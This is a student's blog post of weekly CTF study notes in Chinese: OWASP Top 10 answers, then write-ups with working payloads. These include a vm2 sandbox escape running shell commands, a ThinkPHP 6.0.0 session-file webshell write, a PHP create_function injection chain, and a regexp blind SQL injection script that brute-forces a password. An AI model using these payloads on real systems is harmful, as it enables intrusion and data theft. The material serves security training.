---
title: week4
date: 2021-04-25 20:11:54
tags: note

---   

## 总    

星期天才看到web提纲更新了，就写了一下，      
这周复现了大佬的SQL不同姿势笔记，刷了几道题     

### nep2    

视频二：https://www.hacker101.com/sessions/pentest_owasp

1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）

	1. Injection---->注入，Sql，nosql,OS injection,LDAP injection       
	2. Broken Authentication--->失效的身份认证和会话管理
	3. Sensitive Data Exposure---->敏感数据泄露
	4. XXE
	5. Broken Access Control---->越权
	6. Security Misconfiguration.--->安全配置   
	7. XSS
	8. Insecure Deserialization---->不安全的反序列化
	9. Using Components with Known Vulnerabilities---->使用不安全的组件 
	10. Insufficient Logging & Monitoring.---->日志和监控不足
	
	
	严重程度

2.请翻译一下credential stuffing（1分）

	密码嗅探    
[credential stuffing attack---->撞库](https://blog.csdn.net/weixin_44549063/article/details/113518965)



3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分）

	日志记录不足，会使攻击者进一步攻击系统，保持持久性       
	
	owasp tenth




4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分）   

	利用owasp testing guide check-list查找到相关部分进行学习      
	
	小白，还没渗透过。。。。。。。。。         


   




### JustEscape      
![01.png](https://sc01.alicdn.com/kf/H375cdea26ac54e8c8ee6dfdf19c4a90ag.png)      

下面两个demo     

看下`run.php`     




	```php
	<?php
	if( array_key_exists( "code", $_GET ) && $_GET[ 'code' ] != NULL ) {
	    $code = $_GET['code'];
	    echo eval(code);
	} else {
	    highlight_file(__FILE__);
	}
	?>
	```



试了下，感觉什么都执行不了     

前面提示说`真的是 PHP 嘛`      
难道不是PHP      

看下WP   

是js      

js还不会，先简单记一下吧，等学学再回来看看     

[`js  vm2沙箱逃逸`](https://www.anquanke.com/post/id/207291)      

payload:   

	code = '(' + function(){
		TypeError.prototype.get_process = f=>f.constructor("return process")();
		try{
			Object.preventExtensions(Buffer.from("")).a = 1;
		}catch(e){
			return e.get_process(()=>{}).mainModule.require("child_process").execSync("whoami").toString();
		}
	}+')()';
	try{
		console.log(new VM().run(code));
	}catch(x){
		console.log(x);
	}


绕过：`['process', 'exec', 'constructor', 'prototype', 'Function', '"', ''']`      

	?code=(function (){
	    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return proces`}s`}`)();
	    try{
	        Object.preventExtensions(Buffer.from(``)).a = 1;
	    }catch(e){
	        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();
	    }
	})()     


### EasyThinking
看到thinking应该想到应该是thinkphp吧    
输入个不存在的路径     
报错：       

![01.png](https://img12.360buyimg.com/ddimg/jfs/t1/179705/11/761/21532/6083de2cEcdedf453/71fb3eb71da3182c.png)     

[Think PHP V6.0.0任意文件操作漏洞](https://paper.seebug.org/1114/)       

![02.png](https://img12.360buyimg.com/ddimg/jfs/t1/168527/22/21222/15225/6083e0edEd9a623ed/f948321a4e4bf6fb.png)    

32位的PHPSESSID改成一个32位的PHP文件名  
    
![03.png](https://img14.360buyimg.com/ddimg/jfs/t1/182857/21/741/14442/6083e0edEe42ae3cc/2c0d5a4babe2b331.png)      


搜索里面填入一句话      

![04.png](https://img13.360buyimg.com/ddimg/jfs/t1/184862/17/733/11665/6083e167E7e9a71d3/d847018ea02a13d6.png)       
就会被存放到之前写的文件里面  
访问`http://93a0778c-632e-4f47-9ba1-8d8017ef0078.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php`     
最后的文件名是`sess_`+刚才的32位    

![05.png](https://img12.360buyimg.com/ddimg/jfs/t1/173808/39/6300/107394/6083e23eEc8cf917d/e8254e21441627f8.png)      

还要绕过`disable_function`   
和之前那道题一样        

我的蚁剑出问题了      



[之后](https://blog.csdn.net/mochu7777777/article/details/105160796/)        


## EzPHP       

代码审计    





	```php
	 <?php
	highlight_file(__FILE__);
	error_reporting(0); 
	
	$file = "1nD3x.php";
	$shana = $_GET['shana'];
	$passwd = $_GET['passwd'];
	$arg = '';
	$code = '';
	
	echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";
	
	if($_SERVER) { 
	    if (
	        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
	        )  
	        die('You seem to want to do something bad?'); 
	}
	
	if (!preg_match('/http|https/i', $_GET['file'])) {
	    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
	        $file = $_GET["file"]; 
	        echo "Neeeeee! Good Job!<br>";
	    } 
	} else die('fxck you! What do you want to do ?!');
	
	if($_REQUEST) { 
	    foreach($_REQUEST as $value) { 
	        if(preg_match('/[a-zA-Z]/i', $value))  
	            die('fxck you! I hate English!'); 
	    } 
	} 
	
	if (file_get_contents($file) !== 'debu_debu_aqua')
	    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
	
	
	if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
	    extract($_GET["flag"]);
	    echo "Very good! you know my password. But what is flag?<br>";
	} else{
	    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
	}
	
	if(preg_match('/^[a-z0-9]*$/isD', $code) || 
	preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
	    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
	} else { 
	    include "flag.php";
	    $code('', $arg); 
	} ?>
	This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
	Aqua is the cutest five-year-old child in the world! Isn't it ?
	```     






首先第一层：      


	if($_SERVER) { 
	    if (
	        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
	        )  
	        die('You seem to want to do something bad?'); 
	}


url编码可以绕过，`$_SERVER['QUERY_STRING']`接受？后的，不会对其url解码     



第二层：       

	
	if (!preg_match('/http|https/i', $_GET['file'])) {
	    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
	        $file = $_GET["file"]; 
	        echo "Neeeeee! Good Job!<br>";
	    } 
	} else die('fxck you! What do you want to do ?!');     

第二个匹配可以最后加%0a绕过      

第三层：

	if($_REQUEST) { 
	    foreach($_REQUEST as $value) { 
	        if(preg_match('/[a-zA-Z]/i', $value))  
	            die('fxck you! I hate English!'); 
	    } 
	}

绕过`$_REQUEST`        
`$_REQUEST 同时接受 GET 和 POST 的数据，并且 POST 具有更高的优先值`     
所以可以POST数字来绕过     
`POST：debu=1&&file=1 `   


	if (file_get_contents($file) !== 'debu_debu_aqua')
	    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");         

data协议`data://text/plain,debu_debu_aqua`      
`debu_debu_aqua`记得URL编码        

第四层：     

	if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
	    extract($_GET["flag"]);
	    echo "Very good! you know my password. But what is flag?<br>";
	} else{
	    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
	}       

数组绕过     

`shana[]=1&passwd[]=2`      
URL编码     


第五层：    

	if(preg_match('/^[a-z0-9]*$/isD', $code) || 
	preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
	    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
	} else { 
	    include "flag.php";
	    $code('', $arg); 
	} ?>       


$code和$arg可以通过`extract($_GET["flag"]);`传入     

`creat_function()`函数       

![01.png](https://img11.360buyimg.com/ddimg/jfs/t1/163792/4/20511/6856/6082e575Ef04fe2e5/514edbaaa03f01e8.png)      

	$func=creat_function('$a,$b','return $a*$b;');
	func()  就相当于    
	function func($a,$b)
	{
		return $a*$b;
	}  

如果参数可控，我们就可以通过`}`提前结束函数，执行其他语句

	$func=creat_function('$a,$b','return $a*$b;}eval(system('ls'));//');   
	
	function func($a,$b)
		{
			return $a*$b;}
			eval(system('ls'));//}


flag[code]=create_function     
%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E
flag[arg]=;}a();//   
%66%6C%61%67%5B%61%72%67%5D=    

`get_defined_vars()`函数会以数组形式返回所有变量和值        
`flag[code]=create_function&flag[arg]=;}var_dump(get_defined_vars());//`
![02.png](https://img11.360buyimg.com/ddimg/jfs/t1/163461/36/20309/34836/6082eb4cE5ed6382e/e08bdbff0aa587d8.png)         
`require`读取文件      
`flag[arg]=;}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//`    
![03.png](https://img13.360buyimg.com/ddimg/jfs/t1/183003/35/675/45335/6082ec64E4b186153/4b8afb83d9a49b77.png)     
这个是假的     
要用伪协议，URL取反    

`;}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//`      
![04.png](https://img12.360buyimg.com/ddimg/jfs/t1/173695/38/6129/110660/6082ef53Eed0617a1/19b0d876457d7346.png)       




[MORE](https://www.gem-love.com/ctf/770.html)       


### SQLi      

![01.png](https://s.pc.qq.com/tousu/img/20210422/8769310_1619090005.jpg)      


`robots.txt`     

	User-agent: *
	Disallow: /hint.txt      

`hint.txt`      

	$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";
	
	
	If $_POST['passwd'] === admin's password,
	
	Then you will get the flag;     

regexp正则注入         
`regexp`函数，匹配字符      


![02.png](https://s.pc.qq.com/tousu/img/20210422/1627861_1619091624.jpg)         

单引号被过        

用`\`转义username的单引号，passwd后接`||`(或)         

payload:`username=\&passwd=||/**/passwd/**/regexp/**/"^a";%00`     







	```python
	import string
	import requests
	from urllib import parse
	
	passwd = ''
	string= string.ascii_lowercase + string.digits + '_'    #小写字母加数字加_
	url = 'http://83eb23d8-2065-4521-9970-018a0b4ce880.node3.buuoj.cn/index.php'
	
	for n in range(100):
	    for m in string:
	        data = {
	            "username":"\\",
	            "passwd":"||/**/passwd/**/regexp/**/\"^{}\";{}".format((passwd+m),parse.unquote('%00'))       ##parse.unquote进行url解码，不解码直接弄不行
	        }
	        res = requests.post(url,data=data)
	        if 'welcome' in res.text:
	            passwd += m
	            print(m)
	            break
	    if m=='_' and 'welcome' not in res.text:
	        break
	print(passwd)
	```





![03.png](https://s.pc.qq.com/tousu/img/20210422/1945636_1619091932.jpg)